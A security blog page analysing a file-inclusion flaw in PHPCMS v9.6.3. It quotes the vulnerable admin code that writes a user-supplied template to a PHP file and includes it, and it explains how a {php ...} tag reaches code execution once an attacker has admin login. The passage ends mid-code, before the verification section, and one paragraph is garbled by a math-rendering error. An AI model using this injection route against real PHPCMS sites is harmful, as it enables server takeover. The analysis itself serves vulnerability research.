@@ -1,0 +1,509 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>PHPCMSv9.6.3 文件包含漏洞分析 - L1nq Blog</title><meta name="author" content="L1nq">
+<meta name="description" content="PHPCMSV9.6.3 文件包含漏洞分析"><meta name="keywords" content='Files Include'>
+  <meta itemprop="name" content="PHPCMSv9.6.3 文件包含漏洞分析">
+  <meta itemprop="description" content="PHPCMSV9.6.3 文件包含漏洞分析">
+  <meta itemprop="datePublished" content="2025-08-02T18:04:07+00:00">
+  <meta itemprop="dateModified" content="2026-07-09T18:34:45+08:00">
+  <meta itemprop="wordCount" content="717">
+  <meta itemprop="image" content="https://sw1mblu3.fun/1.jpg">
+  <meta itemprop="keywords" content="Files Include"><meta property="og:url" content="https://sw1mblu3.fun/posts/phpcms-v9-6-3-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+  <meta property="og:site_name" content="L1nq Blog">
+  <meta property="og:title" content="PHPCMSv9.6.3 文件包含漏洞分析">
+  <meta property="og:description" content="PHPCMSV9.6.3 文件包含漏洞分析">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-08-02T18:04:07+00:00">
+    <meta property="article:modified_time" content="2026-07-09T18:34:45+08:00">
+    <meta property="article:tag" content="Files Include">
+    <meta property="og:image" content="https://sw1mblu3.fun/1.jpg">
+<meta name="twitter:card" content="summary" /><meta name="twitter:site" content="@L1nq1_" />
+  <meta name="twitter:creator" content="@L1nq1_" /><meta name="twitter:image" content="https://sw1mblu3.fun/1.jpg" /><meta name="twitter:title" content="PHPCMSv9.6.3 文件包含漏洞分析" /><meta name="twitter:description" content="PHPCMSV9.6.3 文件包含漏洞分析" /><meta name="application-name" content="L1nq Blog">
+<meta name="apple-mobile-web-app-title" content="L1nq Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="https://sw1mblu3.fun/posts/phpcms-v9-6-3-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="PHPCMSv9.6.3 文件包含漏洞分析 - L1nq Blog" /><link rel="prev" type="text/html" href="https://sw1mblu3.fun/posts/phpcmsv9-6-1-2-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="PHPCMSv9.6.1-2 任意文件下载漏洞分析" /><link rel="next" type="text/html" href="https://sw1mblu3.fun/posts/%E6%B5%85%E6%9E%90-phpcmsv9-6-3-%E4%B8%8A%E4%B8%8B%E6%96%87%E9%80%83%E9%80%B8%E5%AF%BC%E8%87%B4rce/" title="浅析 PHPCMSv9.6.3 上下文逃逸导致RCE" /><link rel="alternate" type="text/markdown" href="https://sw1mblu3.fun/posts/phpcms-v9-6-3-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.md" title="PHPCMSv9.6.3 文件包含漏洞分析 - L1nq Blog"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "PHPCMSv9.6.3 文件包含漏洞分析",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/sw1mblu3.fun\/posts\/phpcms-v9-6-3-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90\/"
+    },"image": ["https:\/\/sw1mblu3.fun\/1.jpg"],"genre": "posts","keywords": "Files Include","wordcount":  717 ,
+    "url": "https:\/\/sw1mblu3.fun\/posts\/phpcms-v9-6-3-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90\/","datePublished": "2025-08-02T18:04:07+00:00","dateModified": "2026-07-09T18:34:45+08:00","license": "2026","publisher": {
+      "@type": "Organization",
+      "name": "L1nq Blog","logo": "https:\/\/sw1mblu3.fun\/1.jpg"},"author": {
+        "@type": "Person",
+        "name": "L1nq"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script><meta name="view-transition" content="same-origin">
+<script>
+(function() {
+  
+  var hasNative = false;
+  try {
+    if (typeof CSS !== 'undefined' && CSS.supports) {
+      hasNative = CSS.supports('selector(::view-transition-old(root))');
+    }
+  } catch(e) {}
+  if (hasNative) return;
+
+  
+  document.addEventListener('click', function(e) {
+    var a = (e.target && e.target.closest) ? e.target.closest('a') : null;
+    if (!a || !a.href) return;
+    var url;
+    try { url = new URL(a.href, location.href); } catch(e) { return; }
+    if (url.origin !== location.origin) return;
+    if (a.target && a.target === '_blank') return;
+    if (a.hasAttribute && a.hasAttribute('download')) return;
+    if (e.metaKey || e.ctrlKey || e.altKey || e.shiftKey) return;
+
+    e.preventDefault();
+    try { sessionStorage.setItem('_vt', '1'); } catch(e) {}
+    document.documentElement.style.opacity = '0';
+    document.documentElement.style.transition = 'opacity 0.12s ease-out';
+    setTimeout(function() { location.href = a.href; }, 120);
+  }, { capture: true });
+
+  
+  try {
+    if (sessionStorage.getItem('_vt') === '1') {
+      sessionStorage.removeItem('_vt');
+      document.documentElement.style.opacity = '0';
+      document.documentElement.style.transition = 'none';
+      requestAnimationFrame(function() {
+        requestAnimationFrame(function() {
+          document.documentElement.style.transition = 'opacity 0.2s ease-in';
+          document.documentElement.style.opacity = '1';
+        });
+      });
+    }
+  } catch(e) {}
+})();
+</script>
+</head>
+  <body data-instant-intensity="viewport" data-header-desktop="sticky" data-header-mobile="auto">
+    <div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="L1nq Blog"><span class="header-title-text">L1nq Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/links/"><i class="fa-solid fa-link fa-sm" aria-hidden="true"></i> Links</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-user fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+              <i class="fa-solid fa-search" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+              <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" role="button" aria-label="Switch Theme" title="Switch Theme"><i class="fa-solid fa-adjust" aria-hidden="true"></i></li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="L1nq Blog"><span class="header-title-text">L1nq Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="theme-switch" role="button" aria-label="Switch Theme"><i class="fa-solid fa-adjust" aria-hidden="true"></i></div>
+      <div class="menu-toggle" id="menu-toggle-mobile" role="button" aria-labelledby="menu-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                <i class="fa-solid fa-search" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Cancel
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/links/"><i class="fa-solid fa-link fa-sm" aria-hidden="true"></i> Links</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-user fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item"><a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item menu-system"></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>PHPCMSv9.6.3 文件包含漏洞分析</span>
+      </h1></div><div class="post-meta">
+      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="meta-calendar-icon">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+        <path d="M4 7a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2v-12z"/>
+        <path d="M16 3v4"/><path d="M8 3v4"/><path d="M4 11h16"/>
+        <path d="M7 14h.013"/><path d="M10.01 14h.005"/><path d="M13.01 14h.005"/><path d="M16.015 14h.005"/>
+        <path d="M13.015 17h.005"/><path d="M7.01 17h.005"/><path d="M10.01 17h.005"/>
+      </svg><time datetime="2025-08-02T18:04:07Z">2 Aug, 2025</time><span aria-hidden="true">|</span>
+        <a href="true" target="_blank" rel="noopener noreferrer">Edit this page</a></div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#代码审计">代码审计</a></li>
+    <li><a href="#漏洞验证">漏洞验证</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><p>PHPCMSV9.6.3 文件包含漏洞分析</p>
+<h1 class="heading-element" id="代码审计"><span>代码审计</span>
+  <a href="#%e4%bb%a3%e7%a0%81%e5%ae%a1%e8%ae%a1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p>文件包含常出现在 include()、require()、include_once()、require_once() 等，审计时可以直接通过正则的方式追踪危险段
+phpcms v9.6.3 的任意文件包含出现在 phpcms/modules/block/block_admin.php 267行</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">include $filepath;</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>分析 $filepath 变量，发现代码中不仅做了 include 包含文件，还在这之前先创建文件并写入内容，且内容可控</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">public function public_view() {
+</span></span><span class="line"><span class="cl">	if ($data[&#39;type&#39;] == 1) {
+</span></span><span class="line"><span class="cl">	} elseif ($data[&#39;type&#39;] == 2) {
+</span></span><span class="line"><span class="cl">		$template = isset($_POST[&#39;template&#39;]) &amp;&amp; trim($_POST[&#39;template&#39;]) ? trim($_POST[&#39;template&#39;]) : &#39;&#39;;
+</span></span><span class="line"><span class="cl">		//$template 由用户输入，可控
+</span></span><span class="line"><span class="cl">		...
+</span></span><span class="line"><span class="cl">		$str = $tpl-&gt;template_parse(new_stripslashes($template));
+</span></span><span class="line"><span class="cl">		//对 $template 进行过滤
+</span></span><span class="line"><span class="cl">		$filepath = CACHE_PATH.&#39;caches_template&#39;.DIRECTORY_SEPARATOR.&#39;block&#39;.DIRECTORY_SEPARATOR.&#39;tmp_&#39;.$id.&#39;.php&#39;;
+</span></span><span class="line"><span class="cl">		//定义文件路径
+</span></span><span class="line"><span class="cl">		$dir = dirname($filepath);
+</span></span><span class="line"><span class="cl">		if(!is_dir($dir)) {
+</span></span><span class="line"><span class="cl">			@mkdir($dir, 0777, true);
+</span></span><span class="line"><span class="cl">			//创建$dir
+</span></span><span class="line"><span class="cl">		}
+</span></span><span class="line"><span class="cl">		if (@file_put_contents($filepath,$str)) {  //文件写入
+</span></span><span class="line"><span class="cl">			 ob_start();
+</span></span><span class="line"><span class="cl">			 include $filepath;
+</span></span><span class="line"><span class="cl">			 //包含文件
+</span></span><span class="line"><span class="cl">			 $html = ob_get_contents();
+</span></span><span class="line"><span class="cl">			 ob_clean();
+</span></span><span class="line"><span class="cl">			 @unlink($filepath);
+</span></span><span class="line"><span class="cl">		}</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><span class="katex-error" title="ParseError: KaTeX parse error: LaTeX-incompatible input and strict mode is set to &#x27;error&#x27;: Unicode text character &quot;在&quot; used in math mode [unicodeTextInMathMode] at position 4: id 在̲类方法开头会强制转为 int …" style="color:#ff4949">id 在类方法开头会强制转为 int 类型，文件路径是不可控，但对漏洞不影响；</span>template 完全可控的，在 if 判断中进行文件写入，写入成功则包含文件。看看对 $template 过滤
+global.func.php::new_stripslaches() 对转义后的字符去除转义，这根本不是过滤</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">//phpcms/libs/functions/global.func.php
+</span></span><span class="line"><span class="cl">function new_stripslashes($string) {  
+</span></span><span class="line"><span class="cl">    if(!is_array($string)) return stripslashes($string);  
+</span></span><span class="line"><span class="cl">    foreach($string as $key =&gt; $val) $string[$key] = new_stripslashes($val);  
+</span></span><span class="line"><span class="cl">    return $string;  
+</span></span><span class="line"><span class="cl">}</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>以及 template_parse()，简单的正则替换，为指定格式的代码换成 <?php xx?> 的形式</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">//phpcms/libs/classes/template_cache.class.php
+</span></span><span class="line"><span class="cl">public function template_parse($str) {  
+</span></span><span class="line"><span class="cl">    $str = preg_replace ( &#34;/\{template\s+(.+)\}/&#34;, &#34;&lt;?php include template(\\1); ?&gt;&#34;, $str );  
+</span></span><span class="line"><span class="cl">    $str = preg_replace ( &#34;/\{include\s+(.+)\}/&#34;, &#34;&lt;?php include \\1; ?&gt;&#34;, $str );  
+</span></span><span class="line"><span class="cl">    $str = preg_replace ( &#34;/\{php\s+(.+)\}/&#34;, &#34;&lt;?php \\1?&gt;&#34;, $str );  
+</span></span><span class="line"><span class="cl">    $str = preg_replace ( &#34;/\{if\s+(.+?)\}/&#34;, &#34;&lt;?php if(\\1) { ?&gt;&#34;, $str );  
+</span></span><span class="line"><span class="cl">    $str = preg_replace ( &#34;/\{else\}/&#34;, &#34;&lt;?php } else { ?&gt;&#34;, $str );  
+</span></span><span class="line"><span class="cl">    $str = preg_replace ( &#34;/\{elseif\s+(.+?)\}/&#34;, &#34;&lt;?php } elseif (\\1) { ?&gt;&#34;, $str );  
+</span></span><span class="line"><span class="cl">    $str = preg_replace ( &#34;/\{\/if\}/&#34;, &#34;&lt;?php } ?&gt;&#34;, $str );  
+</span></span><span class="line"><span class="cl">    //for 循环  
+</span></span><span class="line"><span class="cl">    $str = preg_replace(&#34;/\{for\s+(.+?)\}/&#34;,&#34;&lt;?php for(\\1) { ?&gt;&#34;,$str);  
+</span></span><span class="line"><span class="cl">    $str = preg_replace(&#34;/\{\/for\}/&#34;,&#34;&lt;?php } ?&gt;&#34;,$str);  
+</span></span><span class="line"><span class="cl">    //++ --  
+</span></span><span class="line"><span class="cl">    $str = preg_replace(&#34;/\{\+\+(.+?)\}/&#34;,&#34;&lt;?php ++\\1; ?&gt;&#34;,$str);  
+</span></span><span class="line"><span class="cl">    $str = preg_replace(&#34;/\{\-\-(.+?)\}/&#34;,&#34;&lt;?php ++\\1; ?&gt;&#34;,$str);  
+</span></span><span class="line"><span class="cl">    $str = preg_replace(&#34;/\{(.+?)\+\+\}/&#34;,&#34;&lt;?php \\1++; ?&gt;&#34;,$str);  
+</span></span><span class="line"><span class="cl">    $str = preg_replace(&#34;/\{(.+?)\-\-\}/&#34;,&#34;&lt;?php \\1--; ?&gt;&#34;,$str);  
+</span></span><span class="line"><span class="cl">    $str = preg_replace ( &#34;/\{loop\s+(\S+)\s+(\S+)\}/&#34;, &#34;&lt;?php \$n=1;if(is_array(\\1)) foreach(\\1 AS \\2) { ?&gt;&#34;, $str );  
+</span></span><span class="line"><span class="cl">    $str = preg_replace ( &#34;/\{loop\s+(\S+)\s+(\S+)\s+(\S+)\}/&#34;, &#34;&lt;?php \$n=1; if(is_array(\\1)) foreach(\\1 AS \\2 =&gt; \\3) { ?&gt;&#34;, $str );  
+</span></span><span class="line"><span class="cl">    $str = preg_replace ( &#34;/\{\/loop\}/&#34;, &#34;&lt;?php \$n++;}unset(\$n); ?&gt;&#34;, $str );  
+</span></span><span class="line"><span class="cl">    $str = preg_replace ( &#34;/\{([a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff:]*\(([^{}]*)\))\}/&#34;, &#34;&lt;?php echo \\1;?&gt;&#34;, $str );  
+</span></span><span class="line"><span class="cl">    $str = preg_replace ( &#34;/\{\\$([a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff:]*\(([^{}]*)\))\}/&#34;, &#34;&lt;?php echo \\1;?&gt;&#34;, $str );  
+</span></span><span class="line"><span class="cl">    $str = preg_replace ( &#34;/\{(\\$[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*)\}/&#34;, &#34;&lt;?php echo \\1;?&gt;&#34;, $str );  
+</span></span><span class="line"><span class="cl">    $str = preg_replace_callback(&#34;/\{(\\$[a-zA-Z0-9_\[\]\&#39;\&#34;\$\x7f-\xff]+)\}/s&#34;,  array($this, &#39;addquote&#39;),$str);  
+</span></span><span class="line"><span class="cl">    $str = preg_replace ( &#34;/\{([A-Z_\x7f-\xff][A-Z0-9_\x7f-\xff]*)\}/s&#34;, &#34;&lt;?php echo \\1;?&gt;&#34;, $str );  
+</span></span><span class="line"><span class="cl">    $str = preg_replace_callback(&#34;/\{pc:(\w+)\s+([^}]+)\}/i&#34;, array($this, &#39;pc_tag_callback&#39;), $str);  
+</span></span><span class="line"><span class="cl">    $str = preg_replace_callback(&#34;/\{\/pc\}/i&#34;, array($this, &#39;end_pc_tag&#39;), $str);  
+</span></span><span class="line"><span class="cl">    $str = &#34;&lt;?php defined(&#39;IN_PHPCMS&#39;) or exit(&#39;No permission resources.&#39;); ?&gt;&#34; . $str;  
+</span></span><span class="line"><span class="cl">    return $str;  
+</span></span><span class="line"><span class="cl">}</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>这里将 {php.*} 格式替换为 <code>&lt;?php.*?&gt;</code> 格式，也就是说即使题目过滤了 <code>&lt;?</code> 这里也能直接绕过</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">str = preg_replace ( &#34;/\{php\s+(.+)\}/&#34;, &#34;&lt;?php \\1?&gt;&#34;, $str );</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>最后将 &ldquo;<?php defined('IN_PHPCMS') or exit('No permission resources.'); ?>&rdquo; 拼接进 $str 之前并返回，但这不影响漏洞</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">$str</span> <span class="o">=</span> <span class="s2">&#34;&lt;?php defined(&#39;IN_PHPCMS&#39;) or exit(&#39;No permission resources.&#39;); ?&gt;&#34;</span> . <span class="nv">$str</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$str</span><span class="p">;</span> </span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>所以这里任意文件包含完全可行！再看逻辑与权限校验部分
+block_admin 构造方法中直接静态调用父类的构造方法，跟进父类看看</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">block_admin</span> <span class="n">extends</span> <span class="n">admin</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">private</span> <span class="err">$</span><span class="n">db</span><span class="p">,</span> <span class="err">$</span><span class="n">siteid</span><span class="p">,</span> <span class="err">$</span><span class="n">priv_db</span><span class="p">,</span> <span class="err">$</span><span class="n">history_db</span><span class="p">,</span> <span class="err">$</span><span class="n">roleid</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">public</span> <span class="n">function</span> <span class="n">__construct</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">db</span> <span class="o">=</span> <span class="n">pc_base</span><span class="p">::</span><span class="n">load_model</span><span class="p">(</span><span class="s1">&#39;block_model&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">priv_db</span> <span class="o">=</span> <span class="n">pc_base</span><span class="p">::</span><span class="n">load_model</span><span class="p">(</span><span class="s1">&#39;block_priv_model&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">history_db</span> <span class="o">=</span> <span class="n">pc_base</span><span class="p">::</span><span class="n">load_model</span><span class="p">(</span><span class="s1">&#39;block_history_model&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">roleid</span> <span class="o">=</span> <span class="err">$</span><span class="n">_SESSION</span><span class="p">[</span><span class="s1">&#39;roleid&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">		<span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">siteid</span> <span class="o">=</span> <span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">get_siteid</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">		<span class="n">parent</span><span class="p">::</span><span class="n">__construct</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>在其父类 admin 构造方法中，做了许多 admin 用户登录校验工作，因此必须先登录到 admin 后台，并获得 pc_hash</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">//phpcms/modules/admin/classes/admin.class.php
+</span></span><span class="line"><span class="cl">public function __construct() {  
+</span></span><span class="line"><span class="cl">    self::check_admin();  //判断用户是否已经登陆
+</span></span><span class="line"><span class="cl">		  =&gt;//admin.class.php 
+</span></span><span class="line"><span class="cl">			final public function check_admin() {
+</span></span><span class="line"><span class="cl">			    // 如果是 admin/index/login 或 admin/index/public_card 这类免登录接口，直接放行
+</span></span><span class="line"><span class="cl">			    if(ROUTE_M ==&#39;admin&#39; &amp;&amp; ROUTE_C ==&#39;index&#39; &amp;&amp; in_array(ROUTE_A, array(&#39;login&#39;, &#39;public_card&#39;))) {  
+</span></span><span class="line"><span class="cl">			       return true;  
+</span></span><span class="line"><span class="cl">			    } else {  
+</span></span><span class="line"><span class="cl">			       // 检查当前会话是否有用户 ID 和角色 ID
+</span></span><span class="line"><span class="cl">			       $userid = param::get_cookie(&#39;userid&#39;);
+</span></span><span class="line"><span class="cl">			       if(!isset($_SESSION[&#39;userid&#39;]) || !isset($_SESSION[&#39;roleid&#39;]) 
+</span></span><span class="line"><span class="cl">			          || !$_SESSION[&#39;userid&#39;] || !$_SESSION[&#39;roleid&#39;] 
+</span></span><span class="line"><span class="cl">			          || $userid != $_SESSION[&#39;userid&#39;]) 
+</span></span><span class="line"><span class="cl">			          // 条件不满足，说明未登录，跳转登录页
+</span></span><span class="line"><span class="cl">			          showmessage(L(&#39;admin_login&#39;),&#39;?m=admin&amp;c=index&amp;a=login&#39;);  
+</span></span><span class="line"><span class="cl">			    }  
+</span></span><span class="line"><span class="cl">			}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    self::check_priv();  //权限判断
+</span></span><span class="line"><span class="cl">    pc_base::load_app_func(&#39;global&#39;,&#39;admin&#39;);  
